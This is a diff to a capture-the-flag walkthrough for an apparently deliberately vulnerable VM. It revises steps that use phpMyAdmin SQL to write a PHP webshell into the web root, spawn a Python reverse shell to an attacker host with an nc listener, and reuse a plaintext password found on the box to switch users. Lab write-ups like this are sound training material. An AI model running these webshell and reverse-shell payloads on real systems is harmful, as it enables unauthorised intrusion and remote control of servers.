@@ -88,31 +88,54 @@
 
 	We can use these credentials to login to **phpMyAdmin** at `/phpmyadmin`.
 
-7. Check Vulnarabilities in this Apache version
+7. SQL Injection and Remote Code Execution
 
-	Search [Exploit DB](https://www.exploit-db.com) for vulnerabilities in this Apache version.
-	There is an Apache suExec exploit available.
-
-8. SQL Injection and Remote Code Execution
-
-	In phpMyAdmin's SQL tab, execute:
+	In phpMyAdmin's SQL tab, we can execute:
 
 	```sql
-	SELECT 1, '<?php symlink(\"/\", \"shell.php\");?>'
-	INTO OUTFILE '/var/www/forum/templates_c/test.php
+	SELECT "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>" 
+	INTO OUTFILE '/var/www/forum/templates_c/payload.php';
 	```
 
-	Verify access:
+	Verify webshell access:
 
 	```
-	https://<vm-ip>/forum/templates_c/shell.php
+	https://<vm-ip>/forum/templates_c/payload.php?cmd=whoami
 	```
 
-	You now have access to the root directory.
+	Confirm it outputs `www-data`.
 
-9. Explore directory
+8. Getting Reverse Shell
 
-	Navigate to the /home directory:
+	Checked for Python binary:
+
+	```
+	https://<vm-ip>/forum/templates_c/payload.php?cmd=which%20python
+	```
+
+	Got `/usr/bin/python`. Now we can give a reverse shell payload:
+
+	```bash
+	python -c "import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<attacker-ip>',<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
+	```
+
+	> Replace `<attacker-ip>` and `<port>`
+
+	Encode the payload for URL and run it via the webshell. Listen on port 1234 with `nc -lvnp 1234` and get a reverse shell as `www-data`.
+	To access the reverse shell, use `nc`:
+
+	```bash
+	nc -lvnp <port>
+	```
+
+9. Local Enumeration
+
+	Inside the shell:
+
+	```bash
+	cd /home
+	ls -l
+	```
 
 	Output:
 
@@ -127,53 +150,48 @@
 	drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
 	```
 
-10. FTP Access as Lmesard
+10. Privilege Escalation: lmezard user
 
-	In `/home/LOOKATME` we can find a `password` file:
+	Navigate to `/home/LOOKATME` and find a `password` file:
 
 	```
 	lmezard:G!@M6f4Eatau{sF"
 	```
 
-	Connect to lmezard FTP:
+	Switch user to lmezard:
 
 	```bash
-	ftp <vm-ip>
+	su lmezard
 	```
 
-	Name: lmezard
+	or exit reverse shell and login using ssh
+
+	```
+	ssh lmezard@<vm-ip>
+	```
+
 	Password: G!@M6f4Eatau{sF"
 
-	Login is successfull.
+	Successfully logged in as lmezard.
 
-11. Access lmezard's Files Using FTP
-
-	List available files:
+11. Accessing Lmezard's Home Directory
 
 	```bash
-	ls
+	cd ~
+	ls -l
 	```
 
 	Output:
 
 	```
-	229 Entering Extended Passive Mode (|||46214|).
-	150 Here comes the directory listing.
-	-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-	-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
-	226 Directory send OK.
+	total 791
+	-rwxr-x--- 1 lmezard lmezard 808960 Oct  8  2015 fun
+	-rwxr-x--- 1 lmezard lmezard     96 Oct 15  2015 README
 	```
 
-	Download both files:
+	Run:
 
-	```ftp
-	get README
-	get fun
 	```
-
-	Examine the README locally:
-
-	```bash
 	cat README
 	```
 
